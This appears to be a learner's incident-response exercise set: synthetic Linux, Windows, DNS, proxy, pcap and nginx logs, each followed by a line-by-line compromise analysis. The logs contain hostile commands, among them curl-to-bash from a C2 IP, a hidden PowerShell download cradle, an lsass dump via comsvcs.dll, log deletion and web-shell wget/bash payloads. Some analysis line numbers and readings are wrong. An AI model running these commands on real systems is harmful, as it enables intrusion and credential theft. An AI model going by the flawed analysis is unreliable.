1.
Identify potential signs of compromise by analyzing the log entries below.

# SSH and Linux Logs:
1. Jan 25 08:11:23 webserver01 sshd[1142]: Accepted password for jsmith from 10.0.2.45 port 50922 ssh2
2. Jan 25 08:13:41 webserver01 sudo: jsmith : TTY=pts/1 ; PWD=/home/jsmith ; USER=root ; COMMAND=/usr/bin/systemctl restart apache2
3. Jan 25 08:22:02 webserver01 sshd[1204]: Failed password for invalid user admin from 192.168.56.101 port 44012 ssh2
4. Jan 25 08:22:04 webserver01 sshd[1205]: Failed password for invalid user root from 192.168.56.101 port 44014 ssh2
5. Jan 25 08:22:06 webserver01 sshd[1206]: Failed password for root from 192.168.56.101 port 44016 ssh2
6. Jan 25 08:22:08 webserver01 sshd[1207]: Accepted password for root from 192.168.56.101 port 44018 ssh2
7. Jan 25 08:23:17 webserver01 sudo: root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl http://198.51.100.23/c2.sh | bash
8. Jan 25 08:25:32 webserver01 cron[1303]: (root) CMD (/usr/bin/find /var/log -name "*.log" -type f -delete)
9. Jan 25 08:27:01 webserver01 sudo: root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/useradd -m intern1
10. Jan 25 08:27:45 webserver01 passwd[1310]: password for 'intern1' changed by root

# Windows Event Logs (Security)
11. 2025-01-25 08:34:12 WinWork01 Microsoft-Windows-Security-Auditing: EventID 4624: An account was successfully logged on. Account Name: jdoe; Logon Type: 2; IP Address: 10.0.0.52
12. 2025-01-25 08:35:00 WinWork01 Microsoft-Windows-Security-Auditing: EventID 4688: A new process has been created. New Process Name: C:\Windows\System32\cmd.exe; Parent Process: explorer.exe; User: jdoe
13. 2025-01-25 08:35:06 WinWork01 Microsoft-Windows-Security-Auditing: EventID 4688: New Process: powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/ps.ps1')"
14. 2025-01-25 08:35:12 WinWork01 Microsoft-Windows-Security-Auditing: EventID 4720: A user account was created. Account Name: tempadmin; Created by: jdoe
15. 2025-01-25 08:36:03 WinWork01 Microsoft-Windows-Security-Auditing: EventID 4625: An account failed to log on. Account Name: administrator; Logon Type: 3; IP: 10.0.2.99
16. 2025-01-25 08:38:18 WinWork01 Microsoft-Windows-Security-Auditing: EventID 4688: New Process: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 580 lsass.dmp full
17. 2025-01-25 08:39:01 WinWork01 Microsoft-Windows-Security-Auditing: EventID 4624: Successful logon. User: tempadmin; Logon Type: 10; IP: 10.0.0.200

# Windows Scheduled Tasks
18. 2025-01-25 08:42:00 WinWork01 Task Scheduler: Task "WinUpdateCheck" triggered. Action: powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\scripts\update.ps1
19. 2025-01-25 08:42:01 WinWork01 Microsoft-Windows-Security-Auditing: EventID 4688: New Process: update.ps1 executed under SYSTEM

# DNS Queries
20. Jan 25 08:10:42 dns01 named[322]: client 10.0.2.45#62421: query: www.office365.com IN A + (dns01.internal)
21. Jan 25 08:35:07 dns01 named[322]: client 10.0.0.52#62543: query: evil.example.com IN A + (dns01.internal)
22. Jan 25 08:42:01 dns01 named[322]: client 10.0.0.52#62544: query: api.evildomain.xyz IN A + (dns01.internal)

# Web Proxy Logs
23. Jan 25 08:35:10 proxy01 httpd: 10.0.0.52 - jdoe [25/Jan/2025:08:35:10 +0000] "GET http://198.51.100.23/ps.ps1 HTTP/1.1" 200
24. Jan 25 08:35:20 proxy01 httpd: 10.0.0.52 - jdoe [25/Jan/2025:08:35:20 +0000] "CONNECT evil.example.com:443 HTTP/1.1" 200
25. Jan 25 08:42:05 proxy01 httpd: 10.0.0.52 - tempadmin [25/Jan/2025:08:42:05 +0000] "GET https://api.evildomain.xyz/beacon HTTP/1.1" 200

# Kernel / System Logs
26. Jan 25 08:35:13 WinWork01 kernel: Driver loaded: mimikatz.sys
27. Jan 25 08:36:00 WinWork01 kernel: Memory access attempt on protected process: lsass.exe by rundll32.exe

# Normal Activity Logs
28. Jan 25 08:11:12 fileserver01 sshd[1112]: Accepted password for svc-backup from 10.0.2.55 port 50210 ssh2
29. Jan 25 08:11:45 fileserver01 sudo: svc-backup : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/rsync -a /data /backup
30. Jan 25 08:13:03 webserver01 sshd[1146]: Accepted password for jdoe from 10.0.0.52 port 50930 ssh2
31. Jan 25 08:13:11 webserver01 sudo: jdoe : TTY=pts/1 ; PWD=/home/jdoe ; USER=root ; COMMAND=/bin/df -h
32. 2025-01-25 08:44:00 WinWork01 Microsoft-Windows-Security-Auditing: EventID 4634: An account was logged off. User: tempadmin
33. 2025-01-25 08:45:05 WinWork01 Microsoft-Windows-Security-Auditing: EventID 4624: Successful logon. User: jdoe; Logon Type: 2

# Suspicious but Ambiguous
34. Jan 25 08:30:12 webserver01 sshd[1250]: Accepted password for intern1 from 10.0.0.99 port 52000 ssh2
35. Jan 25 08:30:15 webserver01 sudo: intern1 : TTY=pts/3 ; PWD=/home/intern1 ; USER=root ; COMMAND=/usr/bin/whoami
36. Jan 25 08:30:20 webserver01 sudo: intern1 : TTY=pts/3 ; PWD=/home/intern1 ; USER=root ; COMMAND=/usr/bin/id
37. Jan 25 08:30:23 webserver01 sudo: intern1 : TTY=pts/3 ; PWD=/home/intern1 ; USER=root ; COMMAND=/bin/bash
38. Jan 25 08:30:28 webserver01 sudo: intern1 : TTY=pts/3 ; PWD=/home/intern1 ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/.../rev.sh | bash





[7.], [8.], [9.]
4 attempts in 2 second intervals trying ssh access to webserver01 with admin / root access
- possible brute force attack
- i would advie block of IP=192.168.56.101
[10.]
successfull login from bruto force / password cracking attackers IP=192.168.56.101
- successful login to root account for webserver01
[11.]
attacker is executing a curl command on webserver01 from his IP and using bash
[12.]
right away is deleting logs in /var/log file
[13.], [14.]
- root user is adding new user intern1
- changed password for intern1

after 18 minutes at 08:34:12
[15.] - [18.]
- account logim (jdoe) with IP=10.0.0.52
- executing cmd.exe
- new process powershell.exe with -hidden flag where he downloads string from IP=198.51.100.23 (needs investigation possible malware)
- created tempadmin account (for unknown reason now

[19.] intern1 (account created by attacker) is being accessed from internal network with IP=10.0.0.99:52000 through ssh
[20.], [21.], [22.]
- attacker is issuing commands to orient in a system
[23.]
- attacker issues curl to external github code
[24.], [25.], [27.]
- mimikatz tool for extracting credentials in older systems from lsass using lsass dump
- issuing command for full lsass dump

[28.] tempadmin - afcount created by attacker is now being accesses through internal IP=10.0.0.200

[29.] 08:35:07 dns query to malicious domain according to our log
[30.] 08:42:01 dns API query to malicious domain

[31.], [32.], [33.], [34]
- looks like force update which hides malware behind itself \update.ps1
- through acount tempadmin seemns to be downloaded cartain malware for persistance and after what tempadmin immediately signes off

[35.] - [38.]
attacker signa in as johndoe account and also same malware as in log before + communicates with api endpoint

————————————————————————
perplexitygoblin (eset) APT actor threat pcap scenario

1. [2025-05-29 08:00:01] 192.168.1.100:25 -> 192.168.1.200:25 | SMTP | Email sent: Subject="Invoice Details" Attachment="invoice.pdf"
2. [2025-05-29 08:00:15] 192.168.1.200:25 -> 192.168.1.100:25 | SMTP | Email received by user@corp.local
3. [2025-05-29 08:05:22] 192.168.1.200:80 -> 192.168.1.100:443 | HTTP | GET /malicious.exe from trustedserver.com
4. [2025-05-29 08:05:25] 192.168.1.100:443 -> 192.168.1.200:80 | HTTP | 200 OK - malicious.exe (SHA256: d41d8cd98f00b204e9800998ecf8427e)
5. [2025-05-29 08:05:30] 192.168.1.100 -> 192.168.1.100 | Process | malicious.exe spawned powershell.exe
6. [2025-05-29 08:05:35] 192.168.1.100:443 -> 192.168.1.200:443 | HTTP | POST /beacon - User-Agent: "Mozilla/5.0"
7. [2025-05-29 08:05:37] 192.168.1.200:443 -> 192.168.1.100:443 | HTTP | Response: Base64-encoded PowerShell command
8. [2025-05-29 08:05:40] 192.168.1.100 -> 192.168.1.100 | Process | Encoded PowerShell decoded and executed
9. [2025-05-29 08:10:50] 192.168.1.100:445 -> 192.168.1.55:445 | SMB | Attempt to connect to IPC$
10. [2025-05-29 08:10:52] 192.168.1.55:445 -> 192.168.1.100:445 | SMB | STATUS_ACCESS_DENIED
11. [2025-05-29 08:15:10] 192.168.1.100:135 -> 192.168.1.200:135 | RPC | Remote Procedure Call to enumerate services
12. [2025-05-29 08:15:12] 192.168.1.200:135 -> 192.168.1.100:135 | RPC | Response: Service enumeration data
13. [2025-05-29 08:20:30] 192.168.1.100:3389 -> 192.168.1.55:3389 | RDP | Remote Desktop Protocol login attempt
14. [2025-05-29 08:20:35] 192.168.1.55:3389 -> 192.168.1.100:3389 | RDP | Login failed: Invalid credentials
15. [2025-05-29 08:25:00] 192.168.1.100:445 -> 192.168.1.55:445 | SMB | Attempt to connect to C$ share
16. [2025-05-29 08:25:05] 192.168.1.55:445 -> 192.168.1.100:445 | SMB | STATUS_ACCESS_DENIED
17. [2025-05-29 08:30:15] 192.168.1.100:53 -> 8.8.8.8:53 | DNS | Query: example.com
18. [2025-05-29 08:30:18] 8.8.8.8:53 -> 192.168.1.100:53 | DNS | Response: A record for example.com
19. [2025-05-29 08:35:20] 192.168.1.100:443 -> 192.168.1.200:443 | HTTPS | POST /upload - Data: {"file": "sensitive_data.txt"}
20. [2025-05-29 08:35:22] 192.168.1.200:443 -> 192.168.1.100:443 | HTTPS | Response: 200 OK
21. [2025-05-29 08:40:30] 192.168.1.100:139 -> 192.168.1.55:139 | NetBIOS | Session setup request
22. [2025-05-29 08:40:32] 192.168.1.55:139 -> 192.168.1.100:139 | NetBIOS | Session setup response: Success
23. [2025-05-29 08:45:40] 192.168.1.100:80 -> 192.168.1.200:80 | HTTP | GET /malicious_update.exe from trustedserver.com
24. [2025-05-29 08:45:42] 192.168.1.200:80 -> 192.168.1.100:80 | HTTP | 200 OK - malicious_update.exe (SHA256: e99a18c428cb38d5f260853678922e03)
25. [2025-05-29 08:45:45] 192.168.1.100 -> 192.168.1.100 | Process | malicious_update.exe spawned powershell.exe
26. [2025-05-29 08:45:50] 192.168.1.100:443 -> 192.168.1.200:443 | HTTPS | POST /beacon - User-Agent: "Mozilla/5.0"
27. [2025-05-29 08:45:52] 192.168.1.200:443 -> 192.168.1.100:443 | HTTPS | Response: Base64-encoded PowerShell command
28. [2025-05-29 08:46:00] 192.168.1.100:135 -> 192.168.1.101:135 | RPC | Remote Service Control enumeration
29. [2025-05-29 08:46:04] 192.168.1.101:135 -> 192.168.1.100:135 | RPC | Response: Service list
30. [2025-05-29 08:50:12] 192.168.1.100:443 -> 203.0.113.42:443 | HTTPS | POST /exfil - Encrypted ZIP sent (sensitive_docs.zip)


ANALYSIS:
[1.] - [3.] email recieved from 192.168.1.200 through SMTP (and internal network ! possible compromise before this since it is coming from inside)
email recieved by user@corp.local
from internal IP 192.168.1.200 outbont connection to previous Internal IP 192.168.1.100 on port 443 with GET request of file malicious.exe
[4.] - [8.]
transfer of file malicious.exe
malicious.exe spawned powershell.exe process
5 seconds after that we have communication with 192.168.1.100 (possible compromised internal node) with POST method of HTTP which responded with Base64 encoded powershell command (possible obfuscation of command)
process ended
[9.] - [10.]
attempt to connect to IPC = interprocesss comunication through SMB = server message block used to communicate between internal services (for example trying multiple passwords to get into file server - for specific details it needs to be added or investigated)
[11.] - [12.]
From IP = 192.168.1.200 use of RPC (remote procedure call = allows program from one PC to execute command on another)
RPC can be used to access sensitive data (used in system administration)
response from 192.168.1.200 back to original possible compromised machine -> 192.168.1.100
[13.] - [14.]
RDP login possibly with data from RPC enumeration of data 11. - 12.
attempt failed because of invalid credentials
[15.] - [16.]
SMB attempt to access priviledged C$ drive
access denied also
[17.] - [20.]
DNS query from IP 192.168.1.100 = original compromised internal computer / node
192.168.1.100 uploaded data to queried A record of example[.]com with POST REQUEST and encrypted HTTPS communication channel on port 443
[21.] - [22.]
setting up session over NetBIOS (networking protocol used for communication between separate computers and apps accross network)
successfully set up session (needs to be investigated for more info)
[23.] - [28.] seems to resemble exactly same pattern as in [1.] - [8.] for analysis of that just look at previous 1-8 information i provided
[29.]
attacker this time succesfully recieved response from RPC for insights it needs to be investigated
[30.]
attacker this time succesfully exfiltrated data over HTTPS to IP = 203.0.113.42 sensitive-docs.zip

————————————————————————
NGINX server logs

2025-05-30 10:01:12 host=nginx01 sourcetype=nginx:access status=200 method=GET uri="/" src_ip=192.168.1.10 user_agent="Mozilla/5.0"
2025-05-30 10:01:13 host=nginx01 sourcetype=nginx:access status=404 method=GET uri="/.env" src_ip=203.0.113.55 user_agent="curl/7.68.0"
2025-05-30 10:01:14 host=nginx01 sourcetype=nginx:access status=403 method=GET uri="/admin" src_ip=203.0.113.55 user_agent="curl/7.68.0"
2025-05-30 10:01:15 host=nginx01 sourcetype=nginx:access status=200 method=POST uri="/login" src_ip=192.168.1.20 user=alice user_agent="Mozilla/5.0"
2025-05-30 10:01:16 host=nginx01 sourcetype=nginx:access status=401 method=POST uri="/login" src_ip=198.51.100.99 user=admin user_agent="Hydra"
2025-05-30 10:01:17 host=nginx01 sourcetype=nginx:access status=401 method=POST uri="/login" src_ip=198.51.100.99 user=admin user_agent="Hydra"
2025-05-30 10:01:18 host=nginx01 sourcetype=nginx:access status=401 method=POST uri="/login" src_ip=198.51.100.99 user=admin user_agent="Hydra"
2025-05-30 10:01:19 host=nginx01 sourcetype=nginx:access status=200 method=POST uri="/login" src_ip=198.51.100.99 user=admin user_agent="Hydra"
2025-05-30 10:01:21 host=nginx01 sourcetype=nginx:access status=200 method=GET uri="/dashboard" src_ip=198.51.100.99 user_agent="Hydra"
2025-05-30 10:01:22 host=nginx01 sourcetype=nginx:access status=500 method=GET uri="/api/export" src_ip=198.51.100.99 user_agent="Hydra"
2025-05-30 10:01:24 host=nginx01 sourcetype=nginx:access status=200 method=GET uri="/robots.txt" src_ip=203.0.113.55 user_agent="curl/7.68.0"
2025-05-30 10:01:25 host=nginx01 sourcetype=nginx:access status=200 method=GET uri="/wp-login.php" src_ip=203.0.113.55 user_agent="sqlmap"
2025-05-30 10:01:26 host=nginx01 sourcetype=nginx:access status=403 method=GET uri="/etc/passwd" src_ip=203.0.113.55 user_agent="sqlmap"
2025-05-30 10:01:27 host=nginx01 sourcetype=nginx:access status=200 method=POST uri="/upload" src_ip=198.51.100.99 user_agent="Hydra"
2025-05-30 10:01:29 host=nginx01 sourcetype=nginx:access status=200 method=GET uri="/uploads/shell.php" src_ip=198.51.100.99 user_agent="Hydra"
2025-05-30 10:01:30 host=nginx01 sourcetype=nginx:access status=200 method=POST uri="/uploads/shell.php" src_ip=198.51.100.99 cmd="ls /var/www" user_agent="Hydra"
2025-05-30 10:01:32 host=nginx01 sourcetype=nginx:access status=200 method=POST uri="/uploads/shell.php" src_ip=198.51.100.99 cmd="wget http://malicious.site/bins/malware.sh" user_agent="Hydra"
2025-05-30 10:01:34 host=nginx01 sourcetype=nginx:access status=200 method=POST uri="/uploads/shell.php" src_ip=198.51.100.99 cmd="bash malware.sh" user_agent="Hydra"

ANALYSIS:
[1.] 10:01:12
status code OK meaning server returned the GET request to the requesting client / service residing at internal network of 192.168.1.10
the client / service is requesting uri=“/“ root directory
it doesnt have to be malicious by iself
[2.] 10:01:013
status code = 404 not found
looks like scan trying to access /.env file (containing for example API keys)
curl also adds suspicion to this request
it is also mase just second after the previous one but this time it is external IP = 203.0.113.55 (i would advise monitoring of this IP)
[3.] 10:01:14
status code = 403 forbidden
just second after first request from IP=203.0.113.55 we have another CURL GET request this time for /admin
this tells the attacker there is /admin directory but he is forbidden from accessing it
[4.] 10:01:15
status = 200 OK
user alice is accessing /login page from IP= 192.168.1.20 nothing malicious looks here
[5.] - [7.] 10:01:16 - 10:01:18
status code = 401 unauthorized (in terms of trying different passwords)
user, script, tool is using HYDRA = tool for password cracking login services
coming from same IP=198.51.100.99 in 4 seconds and 1 second internals
attacker is trying to access ADMIN account
[8.] 10:01:19
status code = 200 OK
admin account was compromised by attacker with HYDRA TOOL requires immediate attention
[9.] 10:01:21
status code = 200 OK
attacker successfully gained access or found out /dashboard with HYDRA tool
IP=198.51.100.99 still
[10.] 10:01:22
code = 500 (internal server error)
HYDRA asked /api/export file but something internally failed
[11.] - [13.]
status 200 = OK
attacker accessing from external IP=203.0.113.55
acessed /robots.txt which is usually used by webcrawlers but can contain /admin informarion
status 200 = OK
accessing wp-login.php (word press login page
sqlmap tool as user_agent (used for scanning websites for sql vulnerability)
status 403 = forbidden
attacker is using sqlmap trying to access etc/passwd probably trying sql injection attack in order to obtain credentials
[14.] - [18.] 10:01:27 - 10:01:34
status = 200 OK
all requests are from IP=198.51.100.99
POST HTTP request to /upload
GET HTTP request to /uploads/shell.php (possiby using HYDRA to find out if this file exists)
POST HTTP to /uploads/shell.php
attacker is looking at contents of /var/www contents of public web server directory using command ls
attacker seems to be using shell.php to install malware through wget http://malicious.site/bins/malware.sh
attacker executes malware.sh through bash